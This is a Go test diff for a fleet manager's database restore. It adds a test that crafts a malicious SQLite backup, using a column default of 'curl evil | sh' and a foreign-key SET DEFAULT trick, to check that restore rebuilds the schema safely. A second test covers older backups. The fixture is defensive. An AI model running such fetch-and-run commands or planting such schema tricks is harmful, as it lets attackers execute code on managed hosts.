@@ -20,7 +20,9 @@ import (
 	"context"
 	"database/sql"
 	"errors"
+	"fmt"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"pmss-fleet-manager/internal/secrets"
@@ -522,5 +524,106 @@ func TestRestoreRefusesForeignSchema(t *testing.T) {
 				t.Fatalf("a refused restore changed the database: %v", got)
 			}
 		})
+	}
+}
+
+// Codex on #222: ordinary tables can carry write side effects too. The
+// backup keeps the genuine start-command ciphertext, copies it into the
+// settings row a migration deletes, and gives boxes a foreign key on
+// (helper, qbt_start_cmd) to settings(key, value) with ON DELETE SET
+// DEFAULT and the attacker's command as the column's default: the
+// migration's DELETE would write the command, and Open would seal it.
+// Restore installs this build's schema with the backup's rows instead,
+// so nothing of the file's schema runs or survives.
+func TestRestoreRebuildsSchema(t *testing.T) {
+	ctx := context.Background()
+	sealA := WithSealer(mustSealer(t, backupKeyA))
+	dir := t.TempDir()
+	backup, a, _ := boundBackup(t, dir)
+	db, err := sql.Open("sqlite", "file:"+backup)
+	if err != nil {
+		t.Fatal(err)
+	}
+	db.SetMaxOpenConns(1)
+	var create string
+	if err := db.QueryRow(`SELECT sql FROM sqlite_master WHERE name='boxes'`).Scan(&create); err != nil {
+		t.Fatal(err)
+	}
+	evil := strings.Replace(create, "qbt_start_cmd TEXT NOT NULL DEFAULT ''", "qbt_start_cmd TEXT NOT NULL DEFAULT 'curl evil | sh'", 1)
+	if evil == create {
+		t.Fatal("fixture: column definition not found")
+	}
+	evil = strings.TrimSuffix(strings.TrimSpace(evil), ")") + ", helper TEXT, FOREIGN KEY (helper, qbt_start_cmd) REFERENCES settings(key, value) ON DELETE SET DEFAULT)"
+	for _, q := range []string{
+		`PRAGMA foreign_keys=OFF`,
+		`PRAGMA legacy_alter_table=ON`,
+		`ALTER TABLE boxes RENAME TO boxes_old`,
+		evil,
+		`INSERT INTO boxes SELECT *, NULL FROM boxes_old`,
+		`DROP TABLE boxes_old`,
+		`CREATE UNIQUE INDEX settings_kv ON settings(key, value)`,
+		`INSERT INTO settings(key, value) SELECT 'pmdb_upload_key', qbt_start_cmd FROM boxes WHERE id=` + fmt.Sprint(a),
+		`UPDATE boxes SET helper='pmdb_upload_key' WHERE id=` + fmt.Sprint(a),
+	} {
+		if _, err := db.Exec(q); err != nil {
+			t.Fatalf("%s: %v", q, err)
+		}
+	}
+	db.Close()
+	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
+	if _, err := Restore(ctx, live, backup, true, sealA); err != nil {
+		t.Fatalf("restore: %v", err)
+	}
+	s, err := Open(live, sealA)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer s.Close()
+	got, err := s.GetBox(ctx, a)
+	if err != nil || got.QbtStartCmd != "start-a" {
+		t.Fatalf("start command %q %v", got.QbtStartCmd, err)
+	}
+	var fks, extra int
+	if err := s.db.QueryRow(`SELECT count(*) FROM pragma_foreign_key_list('boxes')`).Scan(&fks); err != nil || fks != 0 {
+		t.Fatalf("boxes kept %d foreign keys (%v)", fks, err)
+	}
+	if err := s.db.QueryRow(`SELECT count(*) FROM pragma_table_info('boxes') WHERE name='helper'`).Scan(&extra); err != nil || extra != 0 {
+		t.Fatalf("boxes kept the helper column (%v)", err)
+	}
+	if err := s.db.QueryRow(`SELECT count(*) FROM sqlite_master WHERE name='settings_kv'`).Scan(&extra); err != nil || extra != 0 {
+		t.Fatalf("the backup's index survived (%v)", err)
+	}
+}
+
+// A backup from an older version lacks columns added since: the rebuild
+// gives them this build's defaults. The AUTOINCREMENT counter comes along,
+// so a deleted box's ID is not handed out again.
+func TestRestoreRebuildOlderSchema(t *testing.T) {
+	ctx := context.Background()
+	sealA := WithSealer(mustSealer(t, backupKeyA))
+	dir := t.TempDir()
+	backup, a, b := boundBackup(t, dir)
+	rawExec(t, backup, `DELETE FROM boxes WHERE id=?`, b)
+	rawExec(t, backup, `ALTER TABLE boxes DROP COLUMN listener_only`)
+	rawExec(t, backup, `ALTER TABLE boxes DROP COLUMN cpu_weight`)
+	live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
+	if _, err := Restore(ctx, live, backup, true, sealA); err != nil {
+		t.Fatal(err)
+	}
+	s, err := Open(live, sealA)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer s.Close()
+	got, err := s.GetBox(ctx, a)
+	if err != nil || got.Password != "pw-a" || got.ListenerOnly || got.CPUWeight != 0 {
+		t.Fatalf("%+v %v", got, err)
+	}
+	nb := &Box{Name: "c", Host: "h", User: "u", Enabled: true}
+	if err := s.CreateBox(ctx, nb); err != nil {
+		t.Fatal(err)
+	}
+	if nb.ID <= b {
+		t.Fatalf("new box got ID %d, the deleted one had %d", nb.ID, b)
 	}
 }
